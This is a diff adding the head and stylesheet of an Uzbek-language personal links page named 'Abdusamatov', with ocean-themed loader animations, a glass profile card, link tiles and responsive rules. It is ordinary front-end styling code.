@@ -1,0 +1,1401 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"/>
+  <!-- Ocean Wave SVG Favicon -->
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='16' fill='%23E0F2FE'/%3E%3Cpath d='M4 20 Q8 15 12 20 Q16 25 20 20 Q24 15 28 20' stroke='%230284C7' stroke-width='2.5' fill='none' stroke-linecap='round'/%3E%3Cpath d='M4 14 Q8 9 12 14 Q16 19 20 14 Q24 9 28 14' stroke='%2338BDF8' stroke-width='1.5' fill='none' stroke-linecap='round' opacity='0.8'/%3E%3C/svg%3E"/>
+  <title>Abdusamatov</title>
+  <meta name="description" content="Abdusamatov. Chuqur tafakkur va mustahkam iroda sohibi."/>
+
+  <!-- Google Fonts: Cormorant Garamond & Plus Jakarta Sans -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,600&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet"/>
+
+  <!-- FontAwesome 6 -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
+
+  <style>
+    *, *::before, *::after {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    button, a {
+      touch-action: manipulation;
+    }
+
+    :root {
+      --ocean-bg:       #F0F8FF;
+      --ocean-surface:  #FFFFFF;
+      --ocean-deep:     #082038;
+      --ocean-dark:     #0C385E;
+      --ocean-primary:  #0284C7;
+      --ocean-mid:      #38BDF8;
+      --ocean-light:    #7DD3FC;
+      --ocean-pale:     #BAE6FD;
+      --ocean-ghost:    #F0F9FF;
+      --teal-accent:    #06B6D4;
+      --teal-light:     #67E8F9;
+      --text-main:      #0B1E36;
+      --text-sec:       #2A4362;
+      --text-muted:     #577395;
+      --text-dim:       #88A2BF;
+      --border-subtle:  rgba(14, 165, 233, 0.18);
+      --border-glow:    rgba(56, 189, 248, 0.50);
+      --border-card:    rgba(255, 255, 255, 0.95);
+      --card-bg:        rgba(255, 255, 255, 0.88);
+      --shadow-card:    0 24px 60px -15px rgba(12, 74, 110, 0.10), 0 8px 24px -4px rgba(56, 189, 248, 0.08);
+      --shadow-hover:   0 30px 70px -12px rgba(12, 74, 110, 0.16), 0 12px 30px -4px rgba(14, 165, 233, 0.18);
+    }
+
+    html {
+      height: -webkit-fill-available;
+    }
+
+    html, body {
+      width: 100%;
+      height: 100%;
+      min-height: calc(var(--vh, 1vh) * 100);
+      background: radial-gradient(ellipse 130% 95% at 50% 0%, #FFFFFF 0%, #F0F8FF 40%, #E6F3FD 100%);
+      color: var(--text-main);
+      font-family: 'Plus Jakarta Sans', sans-serif;
+      overflow-x: hidden;
+    }
+
+    body { overflow: hidden; }
+
+    /* ========================================================
+       LOADER SCREEN (YUKSAK SAN'AT DARAJASIDAGI OKEAN ANIMATSIYASI)
+    ======================================================== */
+    #loader {
+      position: fixed;
+      inset: 0;
+      z-index: 99999;
+      background: radial-gradient(ellipse 95% 85% at 50% 45%, #FFFFFF 0%, #F0F8FF 50%, #E0F2FE 100%);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      transition: opacity 1.3s cubic-bezier(0.4, 0, 0.2, 1),
+                  transform 1.3s cubic-bezier(0.4, 0, 0.2, 1),
+                  filter 1.3s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+    #loader.loader-exit {
+      opacity: 0;
+      filter: blur(24px);
+      transform: scale(1.08);
+      pointer-events: none;
+    }
+    #loaderCanvas {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 1;
+    }
+
+    /* Ambient Corner Nautical Wave Flourishes */
+    .loader-corner-waves {
+      position: absolute;
+      inset: 0;
+      pointer-events: none;
+      z-index: 1;
+      opacity: 0.18;
+    }
+    .l-wave-tl { position: absolute; top: -20px; left: -20px; width: 280px; }
+    .l-wave-br { position: absolute; bottom: -20px; right: -20px; width: 280px; transform: rotate(180deg); }
+
+    .loader-stage {
+      position: relative;
+      z-index: 2;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    /* Central Sacred Ocean Emblem */
+    .ocean-emblem {
+      width: 295px;
+      height: 295px;
+      margin-bottom: 22px;
+      position: relative;
+    }
+    .emblem-svg {
+      width: 100%;
+      height: 100%;
+      overflow: visible;
+    }
+
+    /* Concentric Astrolabe Rings */
+    .rot-ring-cw {
+      transform-origin: 200px 200px;
+      animation: spinClockwise 55s linear infinite;
+    }
+    .rot-ring-ccw {
+      transform-origin: 200px 200px;
+      animation: spinCounter 42s linear infinite;
+    }
+    .rot-ring-slow {
+      transform-origin: 200px 200px;
+      animation: spinClockwise 85s linear infinite;
+    }
+
+    @keyframes spinClockwise {
+      from { transform: rotate(0deg); }
+      to   { transform: rotate(360deg); }
+    }
+    @keyframes spinCounter {
+      from { transform: rotate(360deg); }
+      to   { transform: rotate(0deg); }
+    }
+
+    /* Core Pulsing Ocean Aura */
+    .ocean-aura {
+      opacity: 0;
+      transform-origin: 200px 82px;
+      animation: auraGlowPulse 2.8s 3.0s ease-in-out infinite alternate forwards;
+    }
+    @keyframes auraGlowPulse {
+      0%   { opacity: 0.25; transform: scale(0.9); }
+      100% { opacity: 0.85; transform: scale(1.18); }
+    }
+
+    /* 1. Abyssal Depths & Anchor Currents */
+    .draw-root {
+      stroke: var(--ocean-primary);
+      stroke-width: 1.4;
+      stroke-linecap: round;
+      fill: none;
+      stroke-dasharray: 120;
+      stroke-dashoffset: 120;
+      animation: drawStroke 2s 0.2s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+    }
+
+    /* 2. Ascending Living Tidal Currents */
+    .draw-stem {
+      stroke: var(--ocean-primary);
+      stroke-width: 1.6;
+      stroke-linecap: round;
+      fill: none;
+      stroke-dasharray: 340;
+      stroke-dashoffset: 340;
+      animation: drawStroke 2.8s 0.4s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+    }
+    .draw-stem-center {
+      stroke: var(--ocean-mid);
+      stroke-width: 1.3;
+      stroke-linecap: round;
+      fill: none;
+      stroke-dasharray: 280;
+      stroke-dashoffset: 280;
+      animation: drawStroke 2.6s 0.7s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+    }
+
+    /* 3. 8 Lateral Wave Breakers */
+    .draw-branch {
+      stroke: var(--ocean-primary);
+      stroke-width: 1.2;
+      stroke-linecap: round;
+      fill: none;
+      stroke-dasharray: 130;
+      stroke-dashoffset: 130;
+    }
+    .br-l1 { animation: drawStroke 1.2s 1.5s cubic-bezier(0.4, 0, 0.2, 1) forwards; }
+    .br-r1 { animation: drawStroke 1.2s 1.7s cubic-bezier(0.4, 0, 0.2, 1) forwards; }
+    .br-l2 { animation: drawStroke 1.2s 2.0s cubic-bezier(0.4, 0, 0.2, 1) forwards; }
+    .br-r2 { animation: drawStroke 1.2s 2.2s cubic-bezier(0.4, 0, 0.2, 1) forwards; }
+    .br-l3 { animation: drawStroke 1.2s 2.5s cubic-bezier(0.4, 0, 0.2, 1) forwards; }
+    .br-r3 { animation: drawStroke 1.2s 2.7s cubic-bezier(0.4, 0, 0.2, 1) forwards; }
+    .br-l4 { animation: drawStroke 1.2s 3.0s cubic-bezier(0.4, 0, 0.2, 1) forwards; }
+    .br-r4 { animation: drawStroke 1.2s 3.2s cubic-bezier(0.4, 0, 0.2, 1) forwards; }
+
+    @keyframes drawStroke {
+      to { stroke-dashoffset: 0; }
+    }
+
+    /* 4. 8 Sculpted Wave Foam Crests (Spring Unfurling) */
+    .bloom-leaf {
+      opacity: 0;
+      transform: scale(0.2);
+    }
+    .lf-l1 { animation: waveBloom 1s 2.3s cubic-bezier(0.34, 1.56, 0.64, 1) forwards; }
+    .lf-r1 { animation: waveBloom 1s 2.5s cubic-bezier(0.34, 1.56, 0.64, 1) forwards; }
+    .lf-l2 { animation: waveBloom 1s 2.8s cubic-bezier(0.34, 1.56, 0.64, 1) forwards; }
+    .lf-r2 { animation: waveBloom 1s 3.0s cubic-bezier(0.34, 1.56, 0.64, 1) forwards; }
+    .lf-l3 { animation: waveBloom 1s 3.3s cubic-bezier(0.34, 1.56, 0.64, 1) forwards; }
+    .lf-r3 { animation: waveBloom 1s 3.5s cubic-bezier(0.34, 1.56, 0.64, 1) forwards; }
+    .lf-l4 { animation: waveBloom 1s 3.8s cubic-bezier(0.34, 1.56, 0.64, 1) forwards; }
+    .lf-r4 { animation: waveBloom 1s 4.0s cubic-bezier(0.34, 1.56, 0.64, 1) forwards; }
+
+    @keyframes waveBloom {
+      0%   { opacity: 0; transform: scale(0.2); }
+      70%  { opacity: 1; transform: scale(1.12); }
+      100% { opacity: 1; transform: scale(1); }
+    }
+
+    /* 5. Apex Crown Lotus & Sacred Water Pearl */
+    .bloom-petal {
+      opacity: 0;
+      transform-origin: 200px 82px;
+      transform: scale(0.3);
+    }
+    .pet-outer { animation: petalOpen 1.2s 4.4s cubic-bezier(0.34, 1.4, 0.64, 1) forwards; }
+    .pet-mid   { animation: petalOpen 1.2s 4.9s cubic-bezier(0.34, 1.4, 0.64, 1) forwards; }
+    .pet-inner { animation: petalOpen 1.2s 5.4s cubic-bezier(0.34, 1.4, 0.64, 1) forwards; }
+    .pet-core  { animation: petalOpen 1.2s 5.8s cubic-bezier(0.34, 1.4, 0.64, 1) forwards; }
+
+    @keyframes petalOpen {
+      0%   { opacity: 0; transform: scale(0.3); }
+      100% { opacity: 1; transform: scale(1); }
+    }
+
+    .stamen-point {
+      opacity: 0;
+      animation: stamenFade 1s 5.9s ease forwards;
+    }
+    @keyframes stamenFade { to { opacity: 1; } }
+
+    /* Rising Water Spores from Crown */
+    .flower-spore {
+      opacity: 0;
+      animation: sporeFloat 3.8s ease-in-out infinite;
+    }
+    .spore-a { animation-delay: 5.8s; }
+    .spore-b { animation-delay: 6.4s; }
+    .spore-c { animation-delay: 7.0s; }
+    .spore-d { animation-delay: 7.6s; }
+
+    @keyframes sporeFloat {
+      0%   { opacity: 0; transform: translate(0, 0) scale(0.4); }
+      35%  { opacity: 0.95; }
+      100% { opacity: 0; transform: translate(var(--dx), -75px) scale(1.5); }
+    }
+
+    /* Royal Shimmering Typography */
+    .loader-title {
+      font-family: 'Cormorant Garamond', serif;
+      font-size: 2.7rem; font-weight: 600;
+      letter-spacing: 0.42em;
+      text-transform: uppercase;
+      opacity: 0; transform: translateY(16px);
+      margin-left: 0.42em;
+      background: linear-gradient(120deg, #082038 0%, #0284C7 30%, #38BDF8 50%, #06B6D4 70%, #082038 100%);
+      background-size: 250% 100%;
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      animation: titleReveal 1.2s 2.6s cubic-bezier(0.22, 1, 0.36, 1) forwards,
+                 shimmerCycle 5s 3.8s ease-in-out infinite;
+    }
+    @keyframes titleReveal {
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes shimmerCycle {
+      0%, 100% { background-position: 0% 50%; }
+      50%      { background-position: 100% 50%; }
+    }
+
+    /* Progress Box & Counter */
+    .loader-progress-box {
+      width: 250px; display: flex; flex-direction: column;
+      align-items: center; margin-top: 32px;
+      opacity: 0; animation: titleReveal 0.8s 3.2s ease forwards;
+    }
+    .progress-track {
+      width: 100%; height: 2px;
+      background: rgba(14, 165, 233, 0.16); border-radius: 4px;
+      overflow: visible; position: relative;
+    }
+    .progress-bar {
+      position: absolute; top: 0; left: 0; height: 100%; width: 0%;
+      background: linear-gradient(90deg, var(--ocean-light), var(--ocean-primary), var(--teal-accent));
+      border-radius: 4px;
+      box-shadow: 0 0 12px rgba(14, 165, 233, 0.7);
+      transition: width 0.1s linear;
+    }
+    .progress-glow-dot {
+      position: absolute; right: -4px; top: -3px;
+      width: 8px; height: 8px; border-radius: 50%;
+      background: #FFFFFF;
+      box-shadow: 0 0 8px #0284C7, 0 0 14px #38BDF8;
+    }
+    .progress-info {
+      width: 100%; display: flex; justify-content: center;
+      margin-top: 14px;
+    }
+    .percentage-text {
+      font-family: 'Cormorant Garamond', serif;
+      font-size: 1.15rem; font-weight: 600;
+      color: var(--ocean-deep); letter-spacing: 0.08em;
+    }
+
+    /* ========== MAIN APP ENTRANCE ========== */
+    #app {
+      position: relative; width: 100%; min-height: 100vh;
+      opacity: 0;
+      transform: translateY(28px) scale(0.98);
+      transition: opacity 1.3s cubic-bezier(0.16, 1, 0.3, 1) 0.1s,
+                  transform 1.3s cubic-bezier(0.16, 1, 0.3, 1) 0.1s;
+      display: flex; flex-direction: column;
+      align-items: center; justify-content: center;
+      padding: 60px 20px 40px; z-index: 10;
+    }
+    #app.visible {
+      opacity: 1;
+      transform: translateY(0) scale(1);
+    }
+
+    #bgCanvas {
+      position: fixed; inset: 0;
+      width: 100%; height: 100%;
+      pointer-events: none; z-index: 0;
+    }
+    .ambient-glow {
+      position: fixed; inset: 0; pointer-events: none; z-index: 0;
+      background:
+        radial-gradient(circle 850px at 15% 15%, rgba(56, 189, 248, 0.22) 0%, transparent 65%),
+        radial-gradient(circle 900px at 85% 85%, rgba(14, 165, 233, 0.16) 0%, transparent 65%),
+        radial-gradient(circle 550px at 50% 30%, rgba(255, 255, 255, 0.92) 0%, transparent 100%),
+        radial-gradient(circle 500px at 80% 20%, rgba(103, 232, 249, 0.22) 0%, transparent 60%);
+    }
+    .watermark { position: fixed; pointer-events: none; z-index: 1; opacity: 0.08; }
+    .wm-tl { top: -30px; left: -30px; width: 280px; transform: rotate(15deg); }
+    .wm-br { bottom: -30px; right: -30px; width: 260px; transform: rotate(195deg); }
+
+    .card-scene {
+      position: relative; z-index: 2;
+      width: 100%; max-width: 420px;
+      display: flex; justify-content: center;
+    }
+
+    /* Glassmorphism Card */
+    .master-card {
+      width: 100%;
+      background: var(--card-bg);
+      backdrop-filter: blur(32px) saturate(180%);
+      -webkit-backdrop-filter: blur(32px) saturate(180%);
+      border: 1px solid var(--border-card);
+      border-radius: 24px; padding: 44px 34px 34px;
+      box-shadow: var(--shadow-card), inset 0 1px 2px rgba(255, 255, 255, 1);
+      position: relative; overflow: hidden;
+      transform: none !important;
+      transition: box-shadow 0.35s ease, border-color 0.35s ease;
+    }
+    .master-card:hover {
+      box-shadow: var(--shadow-hover), inset 0 1px 2px rgba(255, 255, 255, 1);
+      border-color: rgba(56, 189, 248, 0.45);
+      transform: none !important;
+    }
+    .card-top-accent {
+      position: absolute; top: 0; left: 36px; right: 36px; height: 2.5px;
+      background: linear-gradient(90deg, transparent, var(--ocean-light), var(--ocean-primary), var(--teal-accent), var(--ocean-mid), transparent);
+      border-radius: 2px; z-index: 3;
+      box-shadow: 0 0 10px rgba(56, 189, 248, 0.5);
+    }
+    .card-wave-corner {
+      position: absolute; top: 14px; right: 18px;
+      width: 52px; height: 52px; opacity: 0.14;
+      pointer-events: none; z-index: 1;
+    }
+
+    /* Profile Header */
+    .profile-header {
+      position: relative; z-index: 3;
+      display: flex; flex-direction: column;
+      align-items: center; text-align: center;
+    }
+    .avatar-wrapper {
+      position: relative; width: 86px; height: 86px; margin-bottom: 20px;
+    }
+    .avatar-ring-svg {
+      position: absolute; inset: -4px;
+      width: calc(100% + 8px); height: calc(100% + 8px);
+      transform-origin: center; animation: spinCW 60s linear infinite;
+    }
+    .avatar-core {
+      position: absolute; inset: 0; border-radius: 50%;
+      background: linear-gradient(135deg, #FFFFFF 0%, #F0F9FF 100%);
+      border: 1.5px solid rgba(14,165,233,0.25);
+      display: flex; align-items: center; justify-content: center;
+      box-shadow: 0 6px 20px rgba(14,165,233,0.16), 0 0 0 6px rgba(224,242,254,0.70);
+    }
+    .avatar-initial {
+      font-family: 'Cormorant Garamond', serif;
+      font-size: 2.2rem; font-weight: 600;
+      color: var(--ocean-deep); letter-spacing: -0.02em;
+    }
+    .status-badge {
+      position: absolute; bottom: 2px; right: 2px;
+      width: 14px; height: 14px; border-radius: 50%;
+      background: var(--ocean-surface);
+      display: flex; align-items: center; justify-content: center;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.08);
+    }
+    .status-dot {
+      width: 8px; height: 8px; border-radius: 50%; background: #06B6D4; position: relative;
+    }
+    .status-dot::after {
+      content: ''; position: absolute; inset: -3px;
+      border-radius: 50%; background: #06B6D4; opacity: 0.6;
+      animation: dotPulse 2.2s infinite ease-out;
+    }
+    @keyframes dotPulse {
+      0%   { transform: scale(1); opacity: 0.6; }
+      100% { transform: scale(2.4); opacity: 0; }
+    }
+
+    .profile-name {
+      font-family: 'Cormorant Garamond', serif;
+      font-size: 2.35rem; font-weight: 600;
+      color: var(--ocean-deep); letter-spacing: 0.04em;
+      line-height: 1.1; margin-bottom: 12px;
+    }
+    .profile-bio {
+      font-family: 'Cormorant Garamond', serif;
+      font-size: 0.98rem; font-style: italic;
+      font-weight: 400; color: var(--text-sec);
+      letter-spacing: 0.02em; line-height: 1.5;
+      max-width: 320px; margin-bottom: 18px;
+    }
+    .time-bar {
+      display: inline-flex; align-items: center; gap: 7px;
+      font-size: 0.66rem; color: var(--text-sec); font-weight: 500;
+      letter-spacing: 0.08em; padding: 5px 13px;
+      background: rgba(255,255,255,0.92); border-radius: 12px;
+      border: 1px solid rgba(14,165,233,0.20); margin-bottom: 22px;
+      box-shadow: 0 2px 8px rgba(12,74,110,0.05);
+    }
+    .time-bar i { font-size: 0.7rem; color: var(--ocean-primary); }
+
+    .card-divider {
+      position: relative; width: 100%; height: 1px;
+      background: linear-gradient(90deg, transparent, var(--border-subtle), transparent);
+      margin-bottom: 22px; display: flex; align-items: center; justify-content: center;
+    }
+    .divider-node {
+      width: 5px; height: 5px; background: var(--ocean-light);
+      transform: rotate(45deg); border-radius: 1px;
+    }
+
+    /* Links */
+    .links-group {
+      position: relative; z-index: 3;
+      display: flex; flex-direction: column;
+      gap: 10px; width: 100%;
+    }
+    .link-tile {
+      display: flex; align-items: center; gap: 14px;
+      padding: 14px 16px; border-radius: 16px;
+      text-decoration: none; color: var(--text-main);
+      background: rgba(255,255,255,0.95);
+      border: 1px solid rgba(224,242,254,0.95);
+      position: relative; overflow: hidden; cursor: pointer;
+      opacity: 0; transform: translateY(24px);
+      box-shadow: 0 3px 12px rgba(12,74,110,0.04);
+      transition: opacity 0.75s cubic-bezier(0.16,1,0.3,1),
+                  transform 0.75s cubic-bezier(0.16,1,0.3,1),
+                  border-color 0.35s ease, box-shadow 0.35s ease, background 0.35s ease;
+    }
+    #app.visible .link-tile:nth-child(1) { opacity:1; transform:translateY(0); transition-delay:0.15s; }
+    #app.visible .link-tile:nth-child(2) { opacity:1; transform:translateY(0); transition-delay:0.32s; }
+    #app.visible .link-tile:nth-child(3) { opacity:1; transform:translateY(0); transition-delay:0.48s; }
+    #app.visible .link-tile:nth-child(4) { opacity:1; transform:translateY(0); transition-delay:0.62s; }
+
+    .actions-bar {
+      opacity: 0; transform: translateY(18px);
+      transition: opacity 0.75s cubic-bezier(0.16,1,0.3,1) 0.78s,
+                  transform 0.75s cubic-bezier(0.16,1,0.3,1) 0.78s;
+    }
+    #app.visible .actions-bar { opacity:1; transform:translateY(0); }
+
+    .link-tile::before {
+      content: ''; position: absolute; inset: 0;
+      background: linear-gradient(135deg, rgba(240,249,255,0.95) 0%, rgba(224,242,254,0.65) 100%);
+      opacity: 0; transition: opacity 0.35s ease; border-radius: 16px;
+    }
+    .link-tile:hover {
+      background: #FFFFFF;
+      border-color: #38BDF8;
+      transform: translateY(-2px);
+      box-shadow: 0 10px 28px -4px rgba(14,165,233,0.18), 0 2px 6px rgba(0,0,0,0.02);
+    }
+    .link-tile:hover::before { opacity: 1; }
+
+    .tile-ripple {
+      position: absolute; border-radius: 50%;
+      background: rgba(14,165,233,0.20);
+      transform: scale(0); animation: tileRippleAnim 0.75s ease-out;
+      pointer-events: none;
+    }
+    @keyframes tileRippleAnim { to { transform: scale(4); opacity: 0; } }
+
+    .tile-icon-box {
+      width: 42px; height: 42px; border-radius: 12px;
+      background: linear-gradient(135deg, #F0F9FF 0%, #E0F2FE 100%);
+      border: 1px solid rgba(56,189,248,0.30);
+      display: flex; align-items: center; justify-content: center;
+      font-size: 1.1rem; color: var(--ocean-primary);
+      flex-shrink: 0; position: relative; z-index: 1;
+      transition: all 0.35s ease;
+      box-shadow: 0 2px 8px rgba(14,165,233,0.10);
+    }
+    .link-tile:hover .tile-icon-box {
+      background: linear-gradient(135deg, #0EA5E9 0%, #0284C7 100%);
+      color: #FFFFFF;
+      border-color: var(--ocean-primary); transform: scale(1.05);
+      box-shadow: 0 4px 14px rgba(14,165,233,0.32);
+    }
+    .tile-content { flex: 1; position: relative; z-index: 1; }
+    .tile-meta { display: flex; align-items: center; justify-content: space-between; margin-bottom: 2px; }
+    .tile-title {
+      font-size: 0.66rem; font-weight: 600;
+      text-transform: uppercase; letter-spacing: 0.12em; color: var(--text-dim);
+    }
+    .tile-handle {
+      font-size: 0.94rem; font-weight: 500;
+      color: var(--text-main); letter-spacing: 0.01em;
+      transition: color 0.3s ease;
+    }
+    .link-tile:hover .tile-handle { color: var(--ocean-primary); }
+    .tile-arrow {
+      font-size: 0.74rem; color: var(--ocean-mid);
+      position: relative; z-index: 1; opacity: 0.5;
+      transform: translateX(-4px); transition: all 0.35s ease;
+    }
+    .link-tile:hover .tile-arrow { opacity:1; transform:translateX(0); color:var(--ocean-primary); }
+
+    /* Actions */
+    .actions-bar {
+      position: relative; z-index: 3;
+      display: flex; gap: 8px; margin-top: 14px; width: 100%;
+    }
+    .action-btn {
+      flex: 1; display: flex; align-items: center;
+      justify-content: center; gap: 7px;
+      padding: 10px 14px; border-radius: 12px;
+      background: rgba(255,255,255,0.90);
+      border: 1px dashed rgba(14,165,233,0.32);
+      color: var(--text-sec); font-size: 0.68rem; font-weight: 500;
+      letter-spacing: 0.06em; cursor: pointer;
+      transition: all 0.3s ease; font-family: inherit;
+      position: relative; overflow: hidden;
+      box-shadow: 0 2px 6px rgba(12,74,110,0.03);
+    }
+    .action-btn i { font-size: 0.7rem; color: var(--ocean-primary); }
+    .action-btn:hover {
+      background: #FFFFFF; border-style: solid; border-color: var(--ocean-primary);
+      color: var(--ocean-primary); box-shadow: 0 4px 14px rgba(14,165,233,0.14);
+    }
+
+    /* Footer */
+    .card-footer {
+      position: relative; z-index: 3; margin-top: 24px; padding-top: 18px;
+      border-top: 1px solid rgba(14,165,233,0.08);
+      display: flex; align-items: center; justify-content: space-between;
+      font-size: 0.66rem; color: var(--text-muted); letter-spacing: 0.04em;
+    }
+    .footer-security { display: flex; align-items: center; gap: 5px; color: var(--ocean-primary); }
+    .footer-security i { font-size: 0.62rem; }
+
+    /* Portal */
+    #linkPortal {
+      position: fixed; inset: 0; z-index: 99990;
+      background: rgba(240, 248, 255, 0.95); backdrop-filter: blur(28px);
+      -webkit-backdrop-filter: blur(28px);
+      display: flex; flex-direction: column;
+      align-items: center; justify-content: center;
+      opacity: 0; pointer-events: none;
+      transition: opacity 0.45s cubic-bezier(0.22,1,0.36,1);
+    }
+    #linkPortal.portal-active { opacity: 1; pointer-events: auto; }
+    .portal-box {
+      display: flex; flex-direction: column;
+      align-items: center; text-align: center;
+      transform: scale(0.92);
+      transition: transform 0.45s cubic-bezier(0.22,1,0.36,1);
+    }
+    #linkPortal.portal-active .portal-box { transform: scale(1); }
+    .portal-emblem-wrap {
+      position: relative; width: 120px; height: 120px;
+      margin-bottom: 22px; display: flex; align-items: center; justify-content: center;
+    }
+    .portal-rings-svg {
+      position: absolute; inset: 0; width: 100%; height: 100%;
+      animation: spinCW 25s linear infinite;
+    }
+    .portal-center-icon {
+      width: 62px; height: 62px; border-radius: 50%;
+      background: #FFFFFF; border: 1.5px solid rgba(56,189,248,0.40);
+      box-shadow: 0 6px 22px rgba(14,165,233,0.18);
+      display: flex; align-items: center; justify-content: center;
+      font-size: 1.5rem; color: var(--ocean-primary);
+      position: relative; z-index: 2;
+    }
+    .portal-target-title {
+      font-family: 'Cormorant Garamond', serif;
+      font-size: 1.9rem; font-weight: 600;
+      color: var(--ocean-deep); letter-spacing: 0.04em; margin-bottom: 4px;
+    }
+    .portal-target-handle {
+      font-size: 0.84rem; color: var(--ocean-primary);
+      letter-spacing: 0.08em; font-weight: 500; margin-bottom: 14px;
+    }
+    .portal-status-line {
+      font-size: 0.66rem; letter-spacing: 0.22em;
+      text-transform: uppercase; color: var(--text-muted); margin-bottom: 18px;
+    }
+    .portal-meter-track {
+      width: 180px; height: 2px;
+      background: rgba(14,165,233,0.15); border-radius: 2px;
+      overflow: hidden; position: relative;
+    }
+    .portal-meter-bar {
+      position: absolute; top: 0; left: 0; height: 100%; width: 0%;
+      background: linear-gradient(90deg, var(--ocean-light), var(--ocean-primary));
+      border-radius: 2px; transition: width 1.0s cubic-bezier(0.22,1,0.36,1);
+    }
+
+    /* Toast */
+    #toast {
+      position: fixed; bottom: 24px; left: 50%;
+      transform: translateX(-50%) translateY(20px);
+      background: #FFFFFF; border: 1px solid var(--border-glow);
+      border-radius: 14px; padding: 10px 20px; font-size: 0.74rem;
+      color: var(--text-main); z-index: 9999; opacity: 0; pointer-events: none;
+      transition: all 0.4s cubic-bezier(0.22,1,0.36,1);
+      box-shadow: 0 10px 30px rgba(12,74,110,0.12);
+      display: flex; align-items: center; gap: 8px; letter-spacing: 0.02em;
+    }
+    #toast.toast-show { opacity:1; transform:translateX(-50%) translateY(0); pointer-events:auto; }
+    #toast i { color: var(--ocean-primary); font-size: 0.8rem; }
+
+    /* Sound Toggle */
+    .sound-toggle {
+      position: fixed; top: 24px; right: 24px; z-index: 1000;
+      display: inline-flex; align-items: center; gap: 9px;
+      background: rgba(255,255,255,0.94); border: 1px solid rgba(186,230,253,0.85);
+      border-radius: 999px; padding: 8px 16px; color: var(--ocean-deep);
+      font-family: inherit; font-size: 0.78rem; font-weight: 500; cursor: pointer;
+      backdrop-filter: blur(14px); -webkit-backdrop-filter: blur(14px);
+      box-shadow: 0 4px 18px rgba(12,74,110,0.08);
+      transition: all 0.35s cubic-bezier(0.22,1,0.36,1); user-select: none;
+    }
+    .sound-toggle:hover {
+      background: var(--ocean-surface); border-color: var(--ocean-primary);
+      transform: translateY(-2px); box-shadow: 0 8px 24px rgba(10,37,64,0.1);
+    }
+    .sound-toggle:active { transform: translateY(0); }
+    .sound-wave-bars { display: flex; align-items: flex-end; gap: 3px; height: 13px; }
+    .sound-wave-bars .bar {
+      width: 2.5px; background: var(--ocean-primary); border-radius: 2px;
+      animation: soundWave 1.1s ease-in-out infinite alternate;
+    }
+    .bar-1 { height: 5px; animation-delay: 0.1s; }
+    .bar-2 { height: 13px; animation-delay: 0.35s; }
+    .bar-3 { height: 8px; animation-delay: 0.2s; }
+    .sound-toggle.muted .sound-wave-bars .bar { animation: none !important; height: 3px !important; opacity: 0.35; }
+    .sound-toggle.muted { opacity: 0.65; color: var(--text-muted); }
+    @keyframes soundWave { 0% { height: 3px; } 100% { height: 13px; } }
+
+    /* ========== RESPONSIVE ========== */
+    @media (max-width: 480px) {
+      #app { min-height: 100dvh; padding-top: max(56px, calc(env(safe-area-inset-top) + 48px)); padding-bottom: max(24px, calc(env(safe-area-inset-bottom) + 16px)); padding-left: 14px; padding-right: 14px; justify-content: center; }
+      .sound-toggle { top: max(14px, env(safe-area-inset-top)); right: max(14px, env(safe-area-inset-right)); padding: 6px 12px; font-size: 0.72rem; gap: 6px; }
+      .master-card { padding: 30px 18px 24px; border-radius: 22px; }
+      .avatar-wrapper { width: 76px; height: 76px; margin-bottom: 14px; }
+      .avatar-initial { font-size: 1.95rem; }
+      .profile-name { font-size: 2.1rem; margin-bottom: 8px; }
+      .profile-bio { font-size: 0.90rem; max-width: 300px; margin-bottom: 16px; }
+      .time-bar { margin-bottom: 16px; padding: 4px 11px; font-size: 0.63rem; }
+      .card-divider { margin-bottom: 16px; }
+      .links-group { gap: 9px; }
+      .link-tile { padding: 12px 14px; gap: 12px; border-radius: 14px; }
+      .tile-icon-box { width: 38px; height: 38px; font-size: 0.98rem; border-radius: 10px; }
+      .tile-handle { font-size: 0.88rem; }
+      .actions-bar { margin-top: 12px; gap: 7px; }
+      .action-btn { padding: 11px 10px; font-size: 0.66rem; border-radius: 10px; }
+      .card-footer { margin-top: 18px; padding-top: 14px; font-size: 0.64rem; }
+      .link-tile:active, .action-btn:active { transform: scale(0.98); transition: transform 0.1s ease; }
+      .sound-toggle:active { transform: scale(0.95); }
+      .ocean-emblem { width: 220px; height: 220px; margin-bottom: 16px; }
+      .loader-title { font-size: 2.1rem; letter-spacing: 0.28em; margin-left: 0.28em; }
+      .progress-track { width: 180px; }
+    }
+    @media (max-width: 360px) {
+      .master-card { padding: 24px 14px 20px; border-radius: 18px; }
+      .profile-name { font-size: 1.85rem; }
+      .profile-bio { font-size: 0.84rem; }
+      .tile-title { font-size: 0.60rem; }
+      .tile-handle { font-size: 0.82rem; }
+      .action-btn { padding: 10px 8px; font-size: 0.62rem; letter-spacing: 0.02em; }
+      .ocean-emblem { width: 185px; height: 185px; margin-bottom: 14px; }
+      .loader-title { font-size: 1.8rem; letter-spacing: 0.20em; margin-left: 0.20em; }
+      .progress-track { width: 150px; }
+    }
+
